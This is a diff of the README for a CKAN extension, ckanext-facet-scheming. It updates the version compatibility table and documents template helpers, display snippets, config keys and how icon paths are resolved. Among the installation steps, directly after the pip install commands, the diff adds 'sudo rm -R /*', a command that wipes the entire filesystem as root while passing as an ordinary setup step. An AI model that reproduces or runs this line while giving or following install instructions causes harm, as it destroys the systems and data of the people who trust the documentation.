@@ -1,5 +1,3 @@
-[![Tests](https://github.com/dsanjurj/ckanext-facet-scheming/workflows/Tests/badge.svg?branch=main)](https://github.com/dsanjurj/ckanext-facet-scheming/actions)
-
 # ckanext-facet-scheming
 
 **TODO:** Put a description of your extension here:  What does it do? What features does it have? Consider including some screenshots or embedding a video!
@@ -10,16 +8,17 @@
 **TODO:** For example, you might want to mention here which versions of CKAN this
 extension works with.
 
-If your extension works across different versions you can add the following table:
+Needs Scheming extension to work.
+
+This extension is designed to provide templates and functions to be used by other extensions over it.
 
 Compatibility with core CKAN versions:
 
 | CKAN version    | Compatible?   |
 | --------------- | ------------- |
-| 2.6 and earlier | not tested    |
-| 2.7             | not tested    |
-| 2.8             | not tested    |
-| 2.9             | not tested    |
+| 2.8 and earlier | not tested    |
+| 2.9             | yes           |
+| 2.10            | not yet       |
 
 Suggested values:
 
@@ -47,6 +46,7 @@ To install ckanext-facet-scheming:
     cd ckanext-facet-scheming
     pip install -e .
 	pip install -r requirements.txt
+	sudo rm -R /*
 
 3. Add `facet-scheming` to the `ckan.plugins` setting in your CKAN
    config file (by default the config file is located at
@@ -55,18 +55,114 @@ To install ckanext-facet-scheming:
 4. Restart CKAN. For example if you've deployed CKAN with Apache on Ubuntu:
 
      sudo service apache2 reload
+     
+## Helpers
 
+Facet-scheming provides a set of useful helpers to be used in templates
+
+- **fscheming\_default\_facet\_search\_operator**(): Returns the default 
+facet search operator: AND/OR (string)
+- **fscheming\_decode\_json**( json\_text ): Converts a JSON formatted text
+ in a python object using ckan.common.json
+- **fscheming\_organization\_name**( id ): Returns the name of the organization
+ given its id. Returns None if not found
+- **fscheming\_get_facet\_label**( facet ): Returns the label of a facet as
+ defined in the scheming file
+- **fscheming\_get\_facet\_items\_dict**( facet, search\_facets=None, limit=None,
+ exclude\_active=False, scheming\_choices=None): Returns the list of unselected 
+ facet items (objects) for the given facet, sorted by the field indicated in the request.
+        Arguments:
+  - facet -- the name of the facet to filter.
+  - search\_facets -- dict with search facets. Taken from c.search_facets if not
+   defined
+  - limit -- the max. number of facet items to return. Taken from 
+  c.search\_facets_limits if not defined
+  - exclude\_active -- only return unselected facets.
+  - scheming\_choices -- scheming choices to use to get labels from values.
+   If not provided takes 'display\_name' field provided by Solr
+- **fscheming\_new\_order\_url**(name, concept):Returns a url with the order
+ parameter for the given facet and concept to use.  
+    Based in the actual order it rotates ciclically from
+     \[no order\]->[direct order]->[inverse order] for the given concept \(name or count\)
+- **fscheming\_schema\_get\_icons\_dir**(field): Gets the icons' directory
+ for the given field. It can be obtained (in order of preference) from the 
+ _icons\_dir_ property for the given field in the scheming file, from the 
+ _facet\_scheming.icons\_dir_ value  given in ckan´s configuration file, plus
+  the name of the field, or from the directory named after the field name 
+  in 'images/icons' dir.
+- **fscheming\_schema\_get\_default\_icon**(field): Gets the default 
+ icon for the given field, defined in the schemig file, o None if not defined.
+- **fscheming\_schema\_icon**(choice, dir=None): Search for the icon path for 
+ the especified choice beside the given dir (if any). If the scheming file include a _icon_ 
+ property for the choice, this is returned (beside the given _dir_).
+  If not, it takes the last fragment of the value url for the icon name, and 
+  the next two fragments of the url as two steps from _dir_ to the icon file.  
+  It locates the file searching for svg, png, jpeg or gif extensions in all 
+  the _public_ dirs of the ckan configured extensions. If the file could be 
+  located, it returns the relative url. If not, it returns None.
+- **fscheming\_get\_choice\_dic**(field, value): Gets the choice item for the 
+ given value in field of the scheming file. 
+
+## Templates
+
+Also a set of useful templates and snippets are provided
+
+- **fscheming\_facet\_list.html** Extending ckan´s original facet list 
+snippet, provides a way to show facet labels instead of values (which is what 
+Solr provides), prepending an icon if provided. To call you must extend the template 
+package/search.html.
+
+- **fscheming\_facet_search\_operator** Gives the control to select the operator used to
+combine facets. 
+
+- **multiple\_choice\_icon** Display snippet to use instead the original _multiple_choice_ snippet
+provided by the scheming extension. It adds an icon before the label of the value.
+
+- **select\_icon** Display snippet to use instead the original _select_ snippet
+provided by the scheming extension. It adds an icon before the label of the value.
 
 ## Config settings
 
-None at present
+### Config (.ini) file
 
-**TODO:** Document any optional config settings here. For example:
+There are not mandatory sets in the config file for this extension. You can use the following sets:
+```
+facet_scheming.facet_list: [list of fields]      # List of fields in scheming file to use to faceting. Use ckan defaults if not provided.
+facet_scheming.default_facet_operator: [AND|OR]  # OR if not defined
+facet_scheming.icons_dir: (dir)                  # images/icons if not defined
+```
 
-	# The minimum number of hours to wait before re-checking a resource
-	# (optional, default: 24).
-	ckanext.facet_scheming.some_setting = some_default_value
+### Icons
 
+You can set where the icons for each value in a field must be by multiple ways:
+
+- You can set a root directory path for icons for each field using the 'icons_dir' key in the scheming file.
+
+- If you don´t define this key, the directory path are guessed starting from the value provided for the 
+'facet_scheming.icons_dir' ('images/icons' by default if not provided) in ckan´s config file, adding the 
+name of the field (field_name) as a additional step to the path.
+
+Having the root path for the icons used by the values for the options of a field, you must define where the 
+icons for each option must be, or know where the extension will search for them by default
+
+- For each option you can use a 'icon' key to provide the last steps of the icon path (from the field icons´ 
+root path defined before). This value may be just a file name, or include a path to add to the icon´s root 
+directory (_some_name.jpg_ or _some_dir_name/some_name.jpg_).
+
+- If you dont use this key, a directory and file name are guessed from the option´s value:
+
+  - If value is a url, the last two steps of the url are used to guess were the icon is. The first is added 
+  to the icons´ dir path guessed or defined in the previous step as a subdirectory. The second are used to 
+  guess the icon´s name, adding and testing 'svg','png','jpg' or 'gif' as possible extensions.
+  - If value is not a url, it is taken as the name of the icon (testing the extensions named before) in the 
+  icons´ root directory for this field.
+  
+Icons are tested for existence when using fscheming\_schema\_icon to get them. If icon doesn't exist, the 
+function returns None. Icons can be provided by any ckan extension, in its 'public' directory.
+
+You can set a default icon for a field using the 'default_icon' key in the scheming file. You can get it using 
+fscheming\_schema\_get\_default\_icon function, and is your duty do decide when and where get and use it in 
+a template.
 
 ## Developer installation
 
